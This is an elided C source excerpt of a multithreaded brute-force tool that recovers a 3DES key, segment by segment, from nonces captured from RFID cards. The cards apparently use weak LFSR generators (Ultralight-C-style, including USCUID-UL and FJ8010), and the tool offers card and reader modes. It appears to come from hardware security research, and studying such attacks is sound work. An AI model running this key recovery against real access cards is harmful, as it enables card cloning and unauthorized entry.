...
pthread_mutex_t found_key_mutex = PTHREAD_MUTEX_INITIALIZER;
...
static void *worker(void *arg) {
    ...
    for (uint32_t idx = start; idx < end; idx++) {
        ...
        if (match) {
            ...
            // Store the found key in global variable
            pthread_mutex_lock(&found_key_mutex);
            if (!key_found) {  // Only store if not already found by another thread
                memcpy(found_key, full_key, KEY_SIZE);
                key_found = 1;  // signal to other threads
                printf("Thread %d: Found key index: %u\n", targs->thread_id, idx);
                printf("Full key (hex): ");
                print_hex(full_key, KEY_SIZE);
            }
            pthread_mutex_unlock(&found_key_mutex);
...
static void print_help_and_exit(const char *cmd_name) {
    fprintf(stderr,
        ...
        "       %s -c [--lfsr 1|2] <null key ERndB (8 hex digits)> <target key ERndB (8 hex digits)> <3DES base key hex (32 hex digits)> <key segment (1-4)> <num threads>\n"
        ...
        "   * Nonce file processing:\n"
        "       %s -f --lfsr 1|2 <nonce file> <num threads>\n",
        cmd_name,
        cmd_name,
        cmd_name);
    exit(1);
...
// Helper function to run the brute force for a single segment
static int run_bruteforce(unsigned char *init_ciphertext, unsigned char *ciphertext,
                         unsigned char *base_key, int seg, int num_threads, lfsr_t lfsr_type,
                         unsigned char *result_key) {
    key_found = 0;  // Reset the global flag
    ...
    for (int i = 0; i < num_threads; i++) {
        ...
        targs[i].is_reader_mode = false;  // File mode always uses counterfeit mode
    ...
    if (key_found && result_key) {
        // Copy the found key from global variable
        pthread_mutex_lock(&found_key_mutex);
        memcpy(result_key, found_key, KEY_SIZE);
        pthread_mutex_unlock(&found_key_mutex);
    }
...
int main(int argc, char **argv) {
    ...
    // Check for -f (file) mode
    if (strcmp(argv[1], "-f") == 0) {
        // File mode: -f --lfsr 1|2 <nonce file> <num threads>
        if (argc != 6) {
            fprintf(stderr, "Error: -f mode requires exactly 5 arguments\n");
            print_help_and_exit(argv[0]);
        }

        // Parse --lfsr flag
        lfsr_t lfsr_type = LFSR_UNDEF;
        if (strcmp(argv[2], "--lfsr") != 0) {
            fprintf(stderr, "Error: -f mode requires --lfsr flag\n");
            print_help_and_exit(argv[0]);
        }
        int lfsr_num = atoi(argv[3]);
        if (lfsr_num == 1) {
            lfsr_type = LFSR_ULCG;
            printf("Using LFSR type: ULCG\n");
        } else if (lfsr_num == 2) {
            lfsr_type = LFSR_MFC;
            printf("Using LFSR type: MFC (USCUID-UL and FJ8010)\n");
        } else {
            fprintf(stderr, "Error: --lfsr must be 1 or 2\n");
            print_help_and_exit(argv[0]);
        }
        ...
        if (!fp) {
            fprintf(stderr, "Error: could not open nonce file: %s\n", argv[4]);
            return 1;
        }

        char line[512];
        char cuid[64], nt100[64], nt75[64], nt50[64], nt25[64];
        if (!fgets(line, sizeof(line), fp)) {
            fprintf(stderr, "Error: could not read from nonce file\n");
            fclose(fp);
            return 1;
        }
        fclose(fp);

        // Parse the line: cuid <value> nt100 <value> nt75 <value> nt50 <value> nt25 <value>
        if (sscanf(line, "cuid %s nt100 %s nt75 %s nt50 %s nt25 %s",
                   cuid, nt100, nt75, nt50, nt25) != 5) {
            fprintf(stderr, "Error: invalid nonce file format\n");
            return 1;
        }
        ...
        // Parse nonce values
        unsigned char val1[BLOCK_SIZE], val2[BLOCK_SIZE], val3[BLOCK_SIZE], val4[BLOCK_SIZE];
        if (!hex_to_bytes(nt100, val1, BLOCK_SIZE)) {
            fprintf(stderr, "Error: invalid nt100 hex string.\n");
            return 1;
        }
        if (!hex_to_bytes(nt75, val2, BLOCK_SIZE)) {
            fprintf(stderr, "Error: invalid nt75 hex string.\n");
            return 1;
        }
        if (!hex_to_bytes(nt50, val3, BLOCK_SIZE)) {
            fprintf(stderr, "Error: invalid nt50 hex string.\n");
            return 1;
        }
        if (!hex_to_bytes(nt25, val4, BLOCK_SIZE)) {
            fprintf(stderr, "Error: invalid nt25 hex string.\n");
            return 1;
        }

        // Initialize with null key
        unsigned char base_key[KEY_SIZE] = {0};
        unsigned char null_cipher[BLOCK_SIZE] = {0};

        // Segment 3 (nt25)
        printf("\n=== Segment 3 (nt25) ===\n");
        if (!run_bruteforce(null_cipher, val4, base_key, 3, num_threads, lfsr_type, base_key)) {
            fprintf(stderr, "Failed to find key for segment 3\n");
            return 1;
        }

        // Segment 4 (nt50)
        printf("\n=== Segment 4 (nt50) ===\n");
        if (!run_bruteforce(null_cipher, val3, base_key, 4, num_threads, lfsr_type, base_key)) {
            fprintf(stderr, "Failed to find key for segment 4\n");
            return 1;
        }

        // Segment 1 (nt75)
        printf("\n=== Segment 1 (nt75) ===\n");
        if (!run_bruteforce(null_cipher, val2, base_key, 1, num_threads, lfsr_type, base_key)) {
            fprintf(stderr, "Failed to find key for segment 1\n");
            return 1;
        }

        // Segment 2 (nt100)
        printf("\n=== Segment 2 (nt100) ===\n");
        if (!run_bruteforce(null_cipher, val1, base_key, 2, num_threads, lfsr_type, base_key)) {
            fprintf(stderr, "Failed to find key for segment 2\n");
            return 1;
        }

        printf("\n=== Final key found ===\n");
        printf("Full key (hex): ");
        print_hex(base_key, KEY_SIZE);

        return 0;
    }

    // Original -c or -r mode
    bool is_reader_mode = false;
    lfsr_t lfsr_type = LFSR_UNDEF;
    int arg_offset = 2;  // Start parsing from argv[2]

    if (strcmp(argv[1], "-c") == 0) {
        is_reader_mode = false;

        // Check for optional --lfsr flag
        if (argc >= 4 && strcmp(argv[2], "--lfsr") == 0) {
            int lfsr_num = atoi(argv[3]);
            if (lfsr_num == 1) {
                lfsr_type = LFSR_ULCG;
                printf("Using LFSR type: ULCG\n");
            ...
            arg_offset = 4;  // Skip --lfsr and its value
            if (argc != 9) {
                fprintf(stderr, "Error: -c mode with --lfsr requires exactly 8 arguments\n");
                print_help_and_exit(argv[0]);
            }
        } else {
            if (argc != 7) {
        ...
        fprintf(stderr, "Error: first argument must be -c, -r, or -f\n");
        print_help_and_exit(argv[0]);
    }
    ...
    if (is_reader_mode) {
        ...
        if (!hex_to_bytes(argv[arg_offset], init_ciphertext, BLOCK_SIZE)) {
            fprintf(stderr, "Error: invalid ERndB hex string.\n");
            return 1;
        }
        if (!hex_to_bytes(argv[arg_offset + 1], tmp_blocks, 2 * BLOCK_SIZE)) {
        ...
        if (!hex_to_bytes(argv[arg_offset + 1], ciphertext, BLOCK_SIZE)) {
            fprintf(stderr, "Error: invalid target key ERndB hex string.\n");
            return 1;
        }
    }
    if (!hex_to_bytes(argv[arg_offset + 2], base_key, KEY_SIZE)) {
        fprintf(stderr, "Error: invalid 3DES base key hex string.\n");
        return 1;
    }

    int seg = atoi(argv[arg_offset + 3]);
    if (seg < 1 || seg > 4) {
        fprintf(stderr, "Error: key segment must be between 1 and 4.\n");
        return 1;
    }
    int num_threads = atoi(argv[arg_offset + 4]);
    if (num_threads < 1) {
        fprintf(stderr, "Error: number of threads must be at least 1.\n");
        return 1;
    }

    // If LFSR type not specified via --lfsr flag, detect it
    if (!is_reader_mode && lfsr_type == LFSR_UNDEF) {
